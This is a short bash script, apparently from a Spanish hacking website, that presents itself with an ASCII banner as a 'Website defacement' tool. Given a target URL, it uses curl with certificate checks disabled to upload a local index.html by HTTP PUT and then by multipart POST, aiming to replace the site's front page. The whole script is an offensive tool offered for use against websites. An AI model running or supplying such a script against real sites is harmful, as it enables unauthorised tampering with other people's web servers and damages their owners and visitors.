#!/bin/bash
# Simple bash script tool

Normal=$(echo 'printf' '\033[39m')
Verde=$(echo 'printf' '\033[32m')
Blanco=$(echo 'printf' '\033[0m')

$Verde
cat << "INFO"
        _       __               
       | |     / _|              
     __| | ___| |_ __ _  ___ ___ 
    / _` |/ _ \  _/ _` |/ __/ _ \
   | (_| |  __/ || (_| | (_|  __/
WEB \__,_|\___|_| \__,_|\___\___| Beta
 
INFO
$Blanco
echo "www.hackingyseguridad.com"
echo
$Blanco
if [ -z "$1" ]; then
        echo "Website defacement. "
        echo "Uso: sh $0 <URL>"
        exit 0
fi

echo
curl -k -T index.html $1
curl -k -X POST -F index.html $1
